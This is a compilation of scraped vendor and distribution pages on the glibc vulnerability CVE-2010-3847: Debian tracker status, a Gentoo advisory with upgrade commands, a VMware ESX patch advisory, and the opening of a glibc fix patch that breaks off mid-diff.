* [See all products](/en/technologies/all-products)

### Tools

* [Training and certification](/en/services/training-and-certification)
* [My account](https://www.redhat.com/wapps/ugc/protected/personalInfo.html)
* [Customer support](https://access.redhat.com)
* [Developer resources](https://developers.redhat.com/)
* [Find a partner](https://catalog.redhat.com/partners)
* [Red Hat Ecosystem Catalog](https://catalog.redhat.com/)
* [Red Hat value calculator](/en/solutions/value-calculator)
* [Documentation](https://docs.redhat.com/en)

### Try, buy, & sell

* [Product trial center](/en/products/trials)
* [Red Hat Marketplace](https://marketplace.redhat.com)
* [Red Hat Store](https://www.redhat.com/en/store)
* [Buy online (Japan)](https://www.redhat.com/en/about/japan-buy)
* [Console](https://cloud.redhat.com/)

### Communicate

* [Contact sales](/en/contact/sales)
* [Contact customer service](/en/contact/customer-service)
* [Contact training](/en/services/training-and-certification/contact-us)
* [Social](/en/about/social)

### About Red Hat

We’re the world’s leading provider of enterprise open source solutions—including Linux, cloud, container, and Kubernetes. We deliver hardened solutions that make it easier for enterprises to work across platforms and environments, from the core datacenter to the network edge.

### Select a language

![](https://static.redhat.com/libs/redhat/rh-iconfont/4/svg/web-icon-globe.svg)

* [简体中文](/zh/services/support)
* [English](/en/services/support)
* [Français](/fr/services/support)
* [Deutsch](/de/services/support)
* [Italiano](/it/services/support)
* [日本語](/ja/services/support)
* [한국어](/ko/services/support)
* [Português](/pt-br/services/support)
* [Español](/es/services/support)
### Red Hat legal and privacy links

* [About Red Hat](/en/about/company)
* [Jobs](/en/jobs)
* [Events](/en/events)
* [Locations](/en/about/office-locations)
* [Contact Red Hat](/en/contact)
* [Red Hat Blog](/en/blog)
* [Diversity, equity, and inclusion](/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

© 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](/en/about/privacy-policy)
* [Terms of use](/en/about/terms-use)
* [All policies and guidelines](/en/about/all-policies-guidelines)
* [Digital accessibility](/en/about/digital-accessibility)



=== Content from security-tracker.debian.org_b1276d1d_20250126_124105.html ===

# CVE-2010-3847

| **Name** | CVE-2010-3847 |
| --- | --- |
| **Description** | elf/dl-load.c in ld.so in the GNU C Library (aka glibc or libc6) through 2.11.2, and 2.12.x through 2.12.1, does not properly handle a value of $ORIGIN for the LD\_AUDIT environment variable, which allows local users to gain privileges via a crafted dynamic shared object (DSO) located in an arbitrary directory. |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2010-3847) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2010-3847); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2010-3847), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2010-3847), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2010-3847), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2010-3847), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2010-3847), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2010-3847), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2010-3847), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2010-3847)/[CVE](https://www.suse.com/security/cve/CVE-2010-3847/), GitHub [advisories](https://github.com/advisories?query=CVE-2010-3847)/[code](https://github.com/search?type=Code&q=%22CVE-2010-3847%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2010-3847%22), [web search](https://duckduckgo.com/html?q=%22CVE-2010-3847%22), [more](https://oss-security.openwall.org/wiki/vendors)) |
| **References** | [DSA-2122-1](/tracker/DSA-2122-1), [DSA-2122-2](/tracker/DSA-2122-2) |
| **Debian Bugs** | [600667](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=600667) |

## Vulnerable and fixed packages

The table below lists information on source packages.

| Source Package | Release | Version | Status |
| --- | --- | --- | --- |
| [glibc](/tracker/source-package/glibc) ([PTS](https://tracker.debian.org/pkg/glibc)) | bullseye | 2.31-13+deb11u11 | fixed |
|  | bullseye (security) | 2.31-13+deb11u10 | fixed |
|  | bookworm | 2.36-9+deb12u9 | fixed |
|  | bookworm (security) | 2.36-9+deb12u7 | fixed |
|  | trixie | 2.40-5 | fixed |
|  | sid | 2.40-6 | fixed |

The information below is based on the following data on fixed versions.

| Package | Type | Release | Fixed Version | Urgency | Origin | Debian Bugs |
| --- | --- | --- | --- | --- | --- | --- |
| [eglibc](/tracker/source-package/eglibc) | source | (unstable) | 2.11.2-8 |  |  | [600667](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=600667) |
| [glibc](/tracker/source-package/glibc) | source | lenny | 2.7-18lenny7 |  | [DSA-2122-2](/tracker/DSA-2122-2) |  |
| [glibc](/tracker/source-package/glibc) | source | (unstable) | 2.11.2-8 |  |  |  |

---

Search for package or bug name:  [Reporting problems](/tracker/data/report)

[Home](/tracker/) - [Debian Security](https://www.debian.org/security/) - [Source](https://salsa.debian.org/security-tracker-team/security-tracker/blob/master/bin/tracker_service.py) [(Git)](https://salsa.debian.org/security-tracker-team/security-tracker)



=== Content from access.redhat.com_b2c40200_20250126_124108.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from security.gentoo.org_b6ba5a15_20250125_231140.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# GNU C library: Multiple vulnerabilities — GLSA **201011-01**

Multiple vulnerabilities were found in glibc, the worst of which allowing
local attackers to execute arbitrary code as root.

### Affected packages

| Package | **sys-libs/glibc** on all architectures |
| --- | --- |
| Affected versions | < **2.11.2-r3** |
| Unaffected versions | >= **2.11.2-r3** |

### Background

The GNU C library is the standard C library used by Gentoo Linux
systems.

### Description

Multiple vulnerabilities were found in glibc, amongst others the
widely-known recent LD\_AUDIT and $ORIGIN issues. For further
information please consult the CVE entries referenced below.

### Impact

A local attacker could execute arbitrary code as root, cause a Denial
of Service, or gain privileges. Additionally, a user-assisted remote
attacker could cause the execution of arbitrary code, and a
context-dependent attacker could cause a Denial of Service.

### Workaround

There is no known workaround at this time.

### Resolution

All GNU C library users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=sys-libs/glibc-2.11.2-r3"
```
### References

* [CVE-2009-4880](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4880)
* [CVE-2009-4881](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4881)
* [CVE-2010-0296](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0296)
* [CVE-2010-0830](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0830)
* [CVE-2010-3847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3847)
* [CVE-2010-3856](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3856)

**Release date**

November 15, 2010

**Latest revision**

November 15, 2010: 01

**Severity**

high

**Exploitable**

local remote

**Bugzilla entries**

* [285818](https://bugs.gentoo.org/show_bug.cgi?id=285818)
* [325555](https://bugs.gentoo.org/show_bug.cgi?id=325555)
* [330923](https://bugs.gentoo.org/show_bug.cgi?id=330923)
* [335871](https://bugs.gentoo.org/show_bug.cgi?id=335871)
* [341755](https://bugs.gentoo.org/show_bug.cgi?id=341755)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from www.vmware.com_0e44f28d_20250125_231154.html ===


Menu

* [Products](https://www.broadcom.com/products/)
* [Solutions](https://www.broadcom.com/solutions)
* [Support and Services](https://www.broadcom.com/support)
* [Company](https://www.broadcom.com/company/about-us/)
* [How To Buy](https://www.broadcom.com/how-to-buy/#sales)

* Log in

  [Log In](/c/portal/login)
  [Register](https://profile.broadcom.com/web/registration)

[Register](https://profile.broadcom.com/web/registration)
[Login](/c/portal/login)

VMSA-2011-0001:VMware ESX third party updates for Service Console packages glibc, sudo, and openldap

Product/Component

VMware

0 more products

List of Products

1 Products

* VMware

Notification Id

23416

Last Updated

02 January 2011

Initial Publication Date

02 January 2011

Status

CLOSED

Severity

HIGH

CVSS Base Score

WorkAround

Affected CVE

CVE-2010-3847,CVE-2010-3856,CVE-2010-2956

## VMSA-2011-0001.3

### VMware ESX third party updates for Service Console packages glibc, sudo, and openldap

##### VMware Security Advisory

#####

VMware Security Advisory Advisory ID:VMSA-2011-0001.3VMware Security Advisory Synopsis:VMware ESX third party updates for Service Console packages glibc, sudo, and openldapVMware Security Advisory Issue date:2011-01-04VMware Security Advisory Updated on:2011-10-27VMware Security Advisory CVE numbers:CVE-2010-3847 CVE-2010-3856 CVE-2010-2956
CVE-2010-0211 CVE-2010-0212
##### 1. Summary

ESX 4.0 Service Console OS (COS) updates for glibc, sudo, and openldap packages.

#####

##### 2. Relevant releases

VMware ESX 4.1 without patches ESX410-201101226-SG, ESX410-201104404-SG

VMware ESX 4.0 without patches ESX400-201101405-SG, ESX400-201101404-SG

##### 3. Problem Description

a. Service Console update for glibc
The service console packages glibc, glibc-common, and nscd are each updated to version 2.5-34.4908.vmw.
The Common Vulnerabilities and Exposures project ( [cve.mitre.org](http://www.cve.mitre.org/)) has assigned the names CVE-2010-3847 and CVE-2010-3856 to the issues addressed in this update.
Column 4 of the following table lists the action required to remediate the vulnerability in each release, if a solution is available.

##### VMware Product =============

##### Product Version =======

##### Running on =======

##### Replace with/ Apply Patch =================

VMware Product ============= VirtualCenteProduct Version ======= anyRunning on ======= WindowsReplace with/ Apply Patch ================= not affectedVMware Product ============= hosted\*Product Version ======= anyRunning on ======= anyReplace with/ Apply Patch ================= not affectedVMware Product ============= ESXiProduct Version ======= anyRunning on ======= ESXiReplace with/ Apply Patch ================= not applicableVMware Product ============= ESXProduct Version ======= 5.0Running on ======= ESXReplace with/ Apply Patch ================= not affectedVMware Product ============= ESXProduct Version ======= 4.1Running on ======= ESXReplace with/ Apply Patch ================= ESX410-201101226-SGVMware Product ============= ESXProduct Version ======= 4.0Running on ======= ESXReplace with/ Apply Patch ================= ESX400-201101405-SGVMware Product ============= ESXProduct Version ======= 3.5Running on ======= ESXReplace with/ Apply Patch ================= not applicableVMware Product ============= ESXProduct Version ======= 3.0.3Running on ======= ESXReplace with/ Apply Patch ================= not applicable

\* hosted products are VMware Workstation, Player, ACE, Fusion.

#####

b. Service Console update for sudo
The service console package sudo is updated to version 1.7.2p1-8.el5\_5.
The Common Vulnerabilities and Exposures project ([cve.mitre.org](http://www.cve.mitre.org/)) has assigned the names CVE-2010-2956 to the issue addressed in this update.
Column 4 of the following table lists the action required to remediate the vulnerability in each release, if a solution is available.

##### VMware Product =============

##### Product Version =======

##### Running on =======

##### Replace with/ Apply Patch =================

VMware Product ============= VirtualCenterProduct Version ======= anyRunning on ======= WindowsReplace with/ Apply Patch ================= not affectedVMware Product ============= hosted \*Product Version ======= anyRunning on ======= anyReplace with/ Apply Patch ================= not affectedVMware Product ============= ESXiProduct Version ======= anyRunning on ======= ESXiReplace with/ Apply Patch ================= not affectedVMware Product ============= ESXProduct Version ======= 5.0Running on ======= ESXReplace with/ Apply Patch ================= not affectedVMware Product ============= ESXProduct Version ======= 4.1Running on ======= ESXReplace with/ Apply Patch ================= ESX410-201104404-SGVMware Product ============= ESXProduct Version ======= 4.0Running on ======= ESXReplace with/ Apply Patch ================= ESX400-201101404-SGVMware Product ============= ESXProduct Version ======= 3.5Running on ======= ESXReplace with/ Apply Patch ================= not applicableVMware Product ============= ESXProduct Version ======= 3.0.3Running on ======= ESXReplace with/ Apply Patch ================= not applicable

\* hosted products are VMware Workstation, Player, ACE, Fusion.

#####

c. Service Console update for openldap
The service console package openldap is updated to version 2.3.43-12.el5\_5.1.
The Common Vulnerabilities and Exposures project ([cve.mitre.org](http://www.cve.mitre.org/)) has assigned the names CVE-2010-0211 and CVE-2010-0212 to the issues addressed in this update.
Column 4 of the following table lists the action required to remediate the vulnerability in each release, if a solution is available.

##### VMware Product =============

##### Product Version =======

##### Running on =======

##### Replace with/ Apply Patch =================

VMware Product ============= VirtualCenterProduct Version ======= anyRunning on ======= WindowsReplace with/ Apply Patch ================= not affectedVMware Product ============= hosted \*Product Version ======= anyRunning on ======= anyReplace with/ Apply Patch ================= not affectedVMware Product ============= ESXiProduct Version ======= anyRunning on ======= ESXiReplace with/ Apply Patch ================= not affectedVMware Product ============= ESXProduct Version ======= 5.0Running on ======= ESXReplace with/ Apply Patch ================= patch pendingVMware Product ============= ESXProduct Version ======= 4.1Running on ======= ESXReplace with/ Apply Patch ================= not affected \*\*VMware Product ============= ESXProduct Version ======= 4.0Running on ======= ESXReplace with/ Apply Patch ================= ESX400-201101402-SG \*\*VMware Product ============= ESXProduct Version ======= 3.5Running on ======= ESXReplace with/ Apply Patch ================= not applicableVMware Product ============= ESXProduct Version ======= 3.0.3Running on ======= ESXReplace with/ Apply Patch ================= not applicable

\* hosted products are VMware Workstation, Player, ACE, Fusion. \*\* After the initial advisory, it was determined that ESX does not contain the affected component of openldap.

##### 4. Solution

Please review the patch/release notes for your product and version and verify the checksum of your downloaded file.

VMware ESX 4.1
---------------------------
VMware ESX 4.1 Update 1
Download link:
[https://hostupdate.vmware.com/software/VUM/OFFLINE/release-259-20110127-527075/update-from-esx4.1-4.1\_update01.ziph](https://hostupdate.vmware.com/software/VUM/OFFLINE/release-259-20110127-527075/update-from-esx4.1-4.1_update01.zip)
md5sum: md5sum: 2d81a87e994aa2b329036f11d90b4c14
sha1sum: c2bfc0cf7ac03d24afd5049ddbd09a865aad1798
<http://kb.vmware.com/kb/1029353>

update-from-esx4.1-4.1\_update01 contains the following security bulletins:
ESX410-201101226-SG (glibc)
<http://kb.vmware.com/kb/1031330> ESX410-201101201-SG (core & CIM)
<http://kb.vmware.com/kb/1027904>

VMware ESX 4.1 Update 1 also contains the following non-security bulletins
ESX410-201101219-UG, ESX410-201101203-UG, ESX410-201101214-UG,
ESX410-201101217-UG, ESX410-201101215-UG, ESX410-201101225-UG,
ESX410-201101223-UG, ESX410-201101216-UG, ESX410-201101202-UG,
ESX410-201101222-UG, ESX410-201101220-UG, ESX410-201101213-UG,
ESX410-201101218-UG, ESX410-201101204-UG, ESX410-201101221-UG,
ESX410-201101211-UG, ESX410-201101206-UG, ESX410-201101207-UG,
ESX410-201101224-UG, ESX410-201101208-UG.

To install an individual bulletin use esxupdate with the -b option.

VMware ESX 4.0
---------------------------
ESX400-201101001
Download link:
<https://hostupdate.vmware.com/software/VUM/OFFLINE/release-257-20101231-664659/ESX400-201101001.zip>
md5sum: f1d522b380692e0845eb0dda480ab890
sha1sum: 906989af3ddacc41321d685c4afe0d740856f9d5
<http://kb.vmware.com/kb/1029426>

ESX400-201101001 contains the following security bulletins:
ESX400-201101401-SG (COS kernel)
<http://kb.vmware.com/kb/1029424> ESX400-201101405-SG (glibc)
<http://kb.vmware.com/kb/1029881> ESX400-201101404-SG (sudo)
<http://kb.vmware.com/kb/1029421> ESX400-201101402-SG (openldap)
<http://kb.vmware.com/kb/1029423>

ESX400-201101401-SG is documented in VMSA-2010-0017.1.

To install an individual bulletin use esxupdate with the -b option.

#####

##### 5. References

CVE numbers

<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3847>
<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3856>
<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2956>
<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0211>
<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0212>

##### 6. Change log

2011-01-04 VMSA-2011-0001 Initial security advisory in conjunction with the release of patches for ESX 4.0 on 2011-01-04.

2011-02-10 VMSA-2011-0001.1 Updated security advisory in conjunction with the release of patches for ESX 4.1 as part of the ESX 4.1 Update 1 release on 2011-02-10.

2011-04-28 VMSA-2011-0001.2 Updated advisory after release of ESX 4.1 patches on 2011-04-28.

2011-10-27 VMSA-2010-0001.3 Updated section 3.c on openldap. After the initial advisory, it was determined that ESX does not contain the affected component of openldap.

#####

##### 7. Contact

E-mail list for product security notifications and announcements:
<http://lists.vmware.com/cgi-bin/mailman/listinfo/security-announce>

This Security Advisory is posted to the following lists:

* security-announce at lists.vmware.com
* bugtraq at securityfocus.com
* full-disclosure at lists.grok.org.uk

E-mail: security at vmware.com
PGP key at:
<http://kb.vmware.com/kb/1055>

VMware Security Advisories
http://www.vmware.com/security/advisories

VMware security response policy
http://www.vmware.com/support/policies/security\_response.html

General support life cycle policy
http://www.vmware.com/support/policies/eos.html

VMware Infrastructure support life cycle policy
http://www.vmware.com/support/policies/eos\_vi.html

Copyright 2011 VMware Inc. All rights reserved.

Hidden

#####

×

It appears your Broadcom Products and Services are

supported by one of our certified Support partners

Click below to be redirected to the appropriate Support

Partner Portal to request support

For non-product related issues (Support Portal / Licensing) Click HERE

Continue

#####

×

For **Technical Support** (issues with products or services)

1. Select **Technical** to be redirected to the My Entitlements page
2. Expand the product you require support on
3. Select the case icon from the case column
4. You will be redirected to the appropriate vendor portal where you can raise your technical request

For **Non-Technical Support** (issues with portal access, license keys, software downloads)

1. Select **Non-Technical** to be redirected to Broadcom's case management portal

Technical
Non-Technical

#####

×

# Access Denied

This feature has been disabled by your administrator.

#####

×

To prevent this message from showing again, please enable pop-up blockers for [support.broadcom.com](https://support.broadcom.com/)
or click Continue to proceed.

Continue

Top

* [Products](https://www.broadcom.com/products)
* [Solutions](https://www.broadcom.com/solutions)
* [Support and Services](https://www.broadcom.com/support)
* [Company](https://www.broadcom.com/)
* [How to Buy](https://www.broadcom.com/how-to-buy)

 Copyright © 2005-2024 Broadcom. All Rights Reserved. The term “Broadcom” refers to Broadcom Inc. and/or its subsidiaries.

* [Accessibility](https://www.broadcom.com/company/legal/accessibility)
* [Privacy](https://www.broadcom.com/company/legal/privacy)
* [Supplier Responsibility](https://www.broadcom.com/company/citizenship/supplier-responsibility)
* [Terms of Use](https://www.broadcom.com/company/legal/terms-of-use)
* [Site Map](https://www.broadcom.com/sitemap)



=== Content from sourceware.org_81c8dbe1_20250125_231142.html ===


This is the mail archive of the
libc-hacker@sourceware.org
mailing list for the [glibc project](/glibc/).

Note that libc-hacker is a closed list. You may look at
the archives of this list, but subscription and posting are not open.

---

| Index Nav: | [[Date Index](index.html#00010)] [[Subject Index](subjects.html#00010)] [[Author Index](authors.html#00010)] [[Thread Index](threads.html#00010)] | |
| --- | --- | --- |
| Message Nav: | [[Date Prev](msg00009.html)] [[Date Next](msg00011.html)] | [[Thread Prev](msg00009.html)] [[Thread Next](msg00011.html)] |
| Other format: | [[Raw text](/cgi-bin/get-raw-msg?listname=libc-hacker&date=2010-10&msgid=m3bp6mb10f.fsf%40hase.home)] |

# [PATCH] Require suid bit on audit objects in privileged programs

* *From*: Andreas Schwab <schwab at redhat dot com>
* *To*: libc-hacker at sourceware dot org
* *Date*: Fri, 22 Oct 2010 19:17:20 +0200
* *Subject*: [PATCH] Require suid bit on audit objects in privileged programs

---

```
2010-10-22  Andreas Schwab  <schwab@redhat.com>

	* include/dlfcn.h (__RTLD_SECURE): Define.
	* elf/dl-load.c (_dl_map_object): Remove preloaded parameter.  Use
	mode & __RTLD_SECURE instead.
	(open_path): Rename preloaded parameter to secure.
	* sysdeps/generic/ldsodefs.h (_dl_map_object): Adjust declaration.
	* elf/dl-open.c (dl_open_worker): Adjust call to _dl_map_object.
	* elf/dl-deps.c (openaux): Likewise.
	* elf/rtld.c (struct map_args): Remove is_preloaded.
	(map_doit): Don't use it.
	(dl_main): Likewise.
	(do_preload): Use __RTLD_SECURE instead of is_preloaded.
	(dlmopen_doit): Add __RTLD_SECURE to mode bits.
---
 elf/dl-deps.c              |    2 +-
 elf/dl-load.c              |   20 +++++++++++---------
 elf/dl-open.c              |    2 +-
 elf/rtld.c                 |   16 +++++++---------
 include/dlfcn.h            |    1 +
 sysdeps/generic/ldsodefs.h |    6 ++----
 6 files changed, 23 insertions(+), 24 deletions(-)

diff --git a/elf/dl-deps.c b/elf/dl-deps.c
index e5b9cdf..1cab2d1 100644
--- a/elf/dl-deps.c
